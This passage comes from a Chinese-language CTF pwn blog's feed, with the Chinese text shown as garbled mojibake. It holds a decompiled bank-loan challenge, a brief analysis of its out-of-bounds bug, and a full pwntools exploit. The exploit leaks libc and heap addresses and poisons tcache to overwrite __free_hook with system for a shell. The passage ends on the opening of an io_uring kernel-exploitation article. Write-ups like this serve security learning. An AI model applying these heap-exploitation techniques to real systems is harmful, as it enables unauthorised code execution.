class="keyword">else</span> <span class="keyword">if</span> ( *(_DWORD *)(user_list[uid] + <span class="number">0x34</span>LL) )</span><br><span class="line">  &#123;</span><br><span class="line">    my_puts(<span class="string">&quot;You still have a loan that has not been paid off, so you cannot continue to borrow.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    my_puts(<span class="string">&quot;Please enter the loan amount (no more than 1 million).&quot;</span>);</span><br><span class="line">    money = input_l();</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)money &gt; <span class="number">0xF4240</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      my_puts(<span class="string">&quot;Don&#x27;t push your luck.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      my_puts(<span class="string">&quot;Please leave your comments.&quot;</span>);</span><br><span class="line">      my_read((<span class="keyword">char</span> *)(loan_money + <span class="number">72LL</span> * loan_idx + <span class="number">0x20</span>), <span class="number">0x20</span>);</span><br><span class="line">      v0 = (__m128i *)(loan_money + <span class="number">72LL</span> * loan_idx);</span><br><span class="line">      chunk = user_list[uid];</span><br><span class="line">      *v0 = _mm_loadu_si128((<span class="keyword">const</span> __m128i *)(chunk + <span class="number">8</span>));</span><br><span class="line">      v0[<span class="number">1</span>] = _mm_loadu_si128((<span class="keyword">const</span> __m128i *)(chunk + <span class="number">0x18</span>));</span><br><span class="line">      LODWORD(chunk) = loan_idx;</span><br><span class="line">      v2 = money;</span><br><span class="line">      *(_QWORD *)(loan_money + <span class="number">72LL</span> * loan_idx + <span class="number">0x40</span>) = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)money;</span><br><span class="line">      v3 = (_DWORD *)user_list[uid];</span><br><span class="line">      v3[<span class="number">10</span>] += v2;</span><br><span class="line">      v3[<span class="number">12</span>] += v2;</span><br><span class="line">      v3[<span class="number">14</span>] = chunk;</span><br><span class="line">      v3[<span class="number">13</span>] = <span class="number">1</span>;</span><br><span class="line">      loan_idx = chunk + <span class="number">1</span>;</span><br><span class="line">      my_puts(<span class="string">&quot;The application has been submitted. Please check it.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°ä¸­çš„å› ä¸ºå¯¹<code>loan_idx</code>æ£€æŸ¥ä¸æ­£ç¡®å¯¼è‡´è¶Šç•Œè¯»å†™ã€‚åˆ©ç”¨æ€è·¯å°±æ˜¯é€šè¿‡è¶Šç•Œå†™ä¿®æ”¹sizeï¼Œä½¿åŸæœ¬chunkçš„sizeå˜ä¸º<code>0x460</code>ï¼Œé‡Šæ”¾åè¿›å…¥<code>unsorted bin</code>é€šè¿‡è¶Šç•Œè¯»è¯»å–libcåœ°å€ã€‚å†é€šè¿‡åŒæ ·çš„åŠæ³•ä½¿ç¬¬ä¸€ä¸ªchunkè¿›å…¥åˆ°tcacheä¸­å»ï¼Œæ³„æ¼å‡ºå †åœ°å€ã€‚æœ€åæœ‰ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªåœ°å€ï¼Œç†æ‰€å½“ç„¶ä¿®æ”¹tcacheä¸­chunkçš„fdæŒ‡é’ˆå³å¯ã€‚</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;Query&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_account</span>(<span class="params">account, password, money</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;new_account&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input the account id&#x27;</span>)</span><br><span class="line">    r.sendline(account)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input the password&#x27;</span>)</span><br><span class="line">    r.sendline(password)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input the money&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(money), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_account</span>(<span class="params">password</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;Cancellation&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please enter the password&#x27;</span>)</span><br><span class="line">    r.sendline(password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_info</span>(<span class="params">new_password, old_password</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;Update_info&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please entet  a new password&#x27;</span>)</span><br><span class="line">    r.sendline(new_password)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input your password.&#x27;</span>)</span><br><span class="line">    r.sendline(old_password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loan_money</span>(<span class="params">amount, comments</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;Loan_money&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Please enter the loan amount (no more than 1 million).&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(amount), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Please leave your comments.&#x27;</span>)</span><br><span class="line">    r.sendline(comments)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">repayment</span>(<span class="params">amount</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;Repayment&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;How much do you want to repay?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(amount), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_all_loan</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&quot;I&#x27;m vip!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit_account</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;Exit_account&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">account, password</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;your choice :     &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;login&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input the account id&#x27;</span>)</span><br><span class="line">    r.sendline(account)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;please input the password&#x27;</span>)</span><br><span class="line">    r.sendline(password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    new_account(<span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x61</span> + i), encoding=<span class="string">&#x27;utf8&#x27;</span>)*<span class="number">0x20</span>,</span><br><span class="line">                <span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x31</span> + i), encoding=<span class="string">&#x27;utf8&#x27;</span>), <span class="number">0x100</span>)</span><br><span class="line">    exit_account()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    login(<span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x61</span> + i), encoding=<span class="string">&#x27;utf8&#x27;</span>)*<span class="number">0x20</span>,</span><br><span class="line">          <span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x31</span> + i), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    loan_money(<span class="number">0x100</span>, <span class="string">b&#x27;dzhsb&#x27;</span>)</span><br><span class="line">    exit_account()</span><br><span class="line"></span><br><span class="line">new_account(flat(<span class="number">0</span>, <span class="number">0x461</span>, [<span class="number">0</span>]*<span class="number">2</span>),</span><br><span class="line">            <span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x31</span> + <span class="number">10</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>), <span class="number">0x100</span>)</span><br><span class="line">exit_account()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    new_account(<span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x61</span> + i + <span class="number">11</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>)*<span class="number">0x20</span>,</span><br><span class="line">                <span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x31</span> + i + <span class="number">11</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>), <span class="number">0xffffffff</span>)</span><br><span class="line">    exit_account()</span><br><span class="line"></span><br><span class="line">login(flat(<span class="number">0</span>, <span class="number">0x461</span>, [<span class="number">0</span>]*<span class="number">2</span>), <span class="built_in">bytes</span>(<span class="built_in">chr</span>(<span class="number">0x31</span> + <span class="number">10</span>), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">loan_money(<span class="number">0x100</span>, <span class="string">b&#x27;dzhsb&#x27;</span>)</span><br><span class="line">exit_account()</span><br><span class="line"></span><br><span class="line">login(flat(<span class="number">0</span>, <span class="string">b&#x27;dzhsb\x00&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x12</span>), flat([<span class="number">0</span>]))</span><br><span class="line">delete_account(flat(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">login(<span class="string">b&#x27;o&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;?&#x27;</span>)</span><br><span class="line">show_all_loan()</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Loan account  :&#x27;</span>)</span><br><span class="line">r.recv(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x1ecbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libc_base + <span class="number">0x1eee48</span></span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;elephant&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>), <span class="string">b&#x27;/bin/sh\x00&#x27;</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;196082&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x6</span>), <span class="string">b&#x27;X&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;fuck_man&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x8</span>), <span class="string">b&#x27;SB&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x6</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">login(<span class="string">b&#x27;196082&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x6</span>), <span class="string">b&#x27;X&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7</span>)</span><br><span class="line">delete_account(<span class="string">b&#x27;X&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7</span>)</span><br><span class="line">login(<span class="string">b&#x27;elephant&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>), <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete_account(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">login(<span class="string">b&#x27;n&#x27;</span>*<span class="number">0x20</span>, <span class="string">b&#x27;&gt;&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">show_all_loan()</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Loan account  :&#x27;</span>)</span><br><span class="line">r.recv(<span class="number">0x10</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x5d0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;elephant&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>), <span class="string">b&#x27;/bin/sh\x00&#x27;</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;196082&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x6</span>), <span class="string">b&#x27;X&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">login(<span class="string">b&#x27;fuck_man&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x8</span>), <span class="string">b&#x27;SB&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x6</span>)</span><br><span class="line">delete_account(<span class="string">b&#x27;SB&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x6</span>)</span><br><span class="line"></span><br><span class="line">login(<span class="string">b&#x27;196082&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x6</span>), <span class="string">b&#x27;X&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7</span>)</span><br><span class="line">delete_account(<span class="string">b&#x27;X&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">password = heap_base + <span class="number">0x620</span></span><br><span class="line">account = heap_base + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">login(flat(account).ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>), flat(password))</span><br><span class="line">update_info(flat(free_hook, [<span class="number">0</span>]*<span class="number">4</span>), flat(password))</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;fuck_man&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x20</span>-<span class="number">0x8</span>), <span class="string">b&#x27;SB&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x6</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">exit_account()</span><br><span class="line">new_account(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x20</span>, flat(system_addr), <span class="number">0x0</span>)</span><br><span class="line">exit_account()</span><br><span class="line">login(<span class="string">b&#x27;elephant&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>), <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete_account(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r, &#x27;b*$rebase(0x187C)&#x27;)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;diary&quot;&gt;&lt;a href=&quot;#diary&quot; class=&quot;headerlink&quot; title=&quot;diary&quot;&gt;&lt;/a&gt;diary&lt;/h2&gt;&lt;h3 id=&quot;åˆ©ç”¨åˆ†æ&quot;&gt;&lt;a href=&quot;#åˆ©ç”¨åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;åˆ©ç”¨åˆ†æ&quot;</summary>
      
    
    
    
    <category term="æ¯”èµ›å¤ç°" scheme="https://196082.github.io/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="UAF" scheme="https://196082.github.io/tags/UAF/"/>
    
  </entry>
  
  <entry>
    <title>io_uringåœ¨kernel pwnä¸­çš„ä¼˜å¼‚è¡¨ç°</title>
    <link href="https://196082.github.io/2023/04/20/io-uring/"/>
    <id>https://196082.github.io/2023/04/20/io-uring/</id>
    <published>2023-04-20T10:13:02.000Z</published>
    <updated>2023-11-29T10:11:41.225Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç›®å‰å„ç§æ¯”èµ›çš„å„ç§èµ›åˆ¶çœŸçš„æ˜¯è®©äººååˆ†éš¾å—ï¼Œä»¥è‡³äºæ„Ÿè§‰è‡ªå·±ä¸æ€ä¹ˆé€‚åˆæ‰“æ¯”èµ›äº†ã€‚æ‰€ä»¥æ‰“ç®—é™ä¸‹å¿ƒæ¥å¤ç°ä¸€åœºæ¯”èµ›ï¼Œåœ¨RCTFä¸­æ‰¾åˆ°åˆ†å€¼æœ€ä½çš„ä¸€é“é¢˜ã€‚åšçš„è¿‡ç¨‹ä¸­è¶Šçœ‹è¶Šä¸å¯¹åŠ²ï¼Œè¿˜ç®—æ˜¯æœ‰éš¾åº¦çš„ä¸€é“å†…æ ¸å †é¢˜æ€ä¹ˆè¢«æ‰“çƒ‚äº†ï¼Œä¸€æœæ‰å‘ç°æ˜¯æœ‰éé¢„æœŸè§£ã€‚ä½†æˆ‘å¤´é“ï¼Œé™ä¸‹å¿ƒæ¥ç”¨é¢„æœŸè§£æ‰“ï¼Œç´¢æ€§åŠŸå¤«ä¸è´Ÿæœ‰å¿ƒäººåœ¨è¿™é“é¢˜ç›®ä¸­å‘ç°äº†ä¸å¾—äº†çš„ä¸œè¥¿ã€‚</p><h3 id="ç›®å‰çš„çª˜å¢ƒ"><a href="#ç›®å‰çš„çª˜å¢ƒ" class="headerlink" title="ç›®å‰çš„çª˜å¢ƒ"></a>ç›®å‰çš„çª˜å¢ƒ</h3><p>å¦‚æœå­˜åœ¨UAFçš„objectè§„å®šå¤§å°åªèƒ½ä¸º0x10çš„è¯ï¼Œå„ä½è‚¯å®šä¼šæƒ³åˆ°ä½¿ç”¨å¯ä»¥å®ç°åˆ†é…ä»»æ„å¤§å°objectçš„å‡½æ•°ã€‚</p><p>æ‰€ä»¥å¦‚æœæåˆ°å†…æ ¸ä¸­å¯ä»¥è¾¾åˆ°ä»»æ„å¤§å°çš„ç»“æ„ä½“æ—¶ä¼°è®¡å„ä½ä¼šæƒ³åˆ°<code>setxattr</code>ã€<code>msg_msg</code>ä¹‹ç±»çš„ã€‚ä½†æ˜¯è¿™ä¸¤è€…å‡å…·æœ‰å¾ˆå¤§çš„å±€é™æ€§ï¼Œ<code>setxattr</code>å‰é¢æåˆ°è¿‡ï¼Œè¿™ä¸ªåœ¨è°ƒç”¨å®Œæˆåä¼š<code>kfree</code>æ‰ä½¿ç”¨çš„objectï¼Œå¹¶ä¸”åœ¨é«˜ç‰ˆæœ¬çš„linuxå†…æ ¸ä¸­è¿™ä¸ªå‡½æ•°æ—©å·²è¢«ä¿®æ”¹äº†ã€‚<code>msg_msg</code>è¿™ä¸ªç»“æ„ä½“å°±æ›´ä¸ºæ˜æ˜¾äº†ï¼Œéœ€è¦ç”¨å¾ˆå¤§çš„ç©ºé—´æ¥ä¿å­˜ç»“æ„ä½“ä¸­çš„æˆå‘˜ã€‚</p><p>å› ä¸ºæ˜¯sizeå¾ˆå°çš„å †å—æ‰€ä»¥å„ä½å¯èƒ½è¿˜ä¼šæ€è€ƒåˆ°ä¸€éƒ¨åˆ†ç»“æ„ä½“ä¾‹å¦‚:<code>seq_operations</code>ã€<code>shm_file_data</code>ä¹‹ç±»çš„ã€‚ä½†æ˜¯ä»–ä»¬çš„sizeä¹Ÿæ˜¯0x20ã€‚</p><h2 id="IO-uring"><a href="#IO-uring" class="headerlink" title="IO_uring"></a>IO_uring</h2><p>ç½‘ä¸Šå…³äºio_uringå¯¹äºkernel pwnçš„åˆ©ç”¨ç›¸å¯¹è¾ƒå°‘ï¼Œç‰¹åˆ«æ˜¯ä¸­æ–‡æ–‡ç« ï¼Œæˆ‘å‡ ä¹æ²¡æœåˆ°ï¼Œæœåˆ°çš„ä¹Ÿåªæ˜¯å¯¹å…¶è¿›è¡Œä»‹ç»ï¼Œå¹¶æ²¡æœ‰å®é™…çš„æ“ä½œä¹‹ç±»çš„ã€‚æ‰€ä»¥ä¸ºäº†å†™è¿™ç¯‡æ–‡ç« æˆ‘çœ‹äº†ä¸¤å¤©Linuxå†…æ ¸çš„æºç ï¼Œçœ¼ç›éƒ½è¦çäº†ï¼ï¼ï¼</p><h3 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>å…³äºIO_uringçš„ä»‹ç»åœ¨ç½‘ä¸Šå…¶å®å¾ˆå¤šã€‚<code>io_uring</code>æ˜¯2019å¹´Linux 5.1å†…æ ¸é¦–æ¬¡å¼•å…¥çš„é«˜æ€§èƒ½å¼‚æ­¥I/Oæ¡†æ¶ï¼Œå¯ä»¥æ˜¾ç€åŠ é€ŸI/Oå¯†é›†å‹åº”ç”¨ç¨‹åºçš„æ€§èƒ½ã€‚ä¸ºäº†å‡å°‘ I/O æ“ä½œæ—¶çš„å†…å­˜æ˜ å°„ï¼Œè¯¥æ¨¡å—å…è®¸ç”¨æˆ·é¢„å…ˆæ³¨å†Œä¸€äº›å›ºå®šçš„ I/O ç¼“å†²åŒºï¼Œä»¥ä¾¿è¿™äº›ç¼“å†²åŒºå¯ä»¥è¢«é‡ç”¨ã€‚è¿™é‡Œæ¨èå¤§å®¶æœ€å¥½å»çœ‹çœ‹å…³äºä»–çš„å®ç°ã€‚</p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è¿™é‡Œç®—æ˜¯è¿™ç¯‡æ–‡ç« çš„é‡ç‚¹ï¼</p><h4 id="åˆ†é…object"><a href="#åˆ†é…object" class="headerlink" title="åˆ†é…object"></a>åˆ†é…object</h4><p>å½“æˆ‘ä»¬è°ƒç”¨<code>io_uring_register_buffers_tags</code>å‡½æ•°æ—¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">io_uring_register_buffers_tags</span><span class="params">(struct io_uring *ring,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">const</span> struct iovec *iovecs,</span></span></span><br><span class="line"><span class="params"><span class="function">   <span class="keyword">const</span> __u64 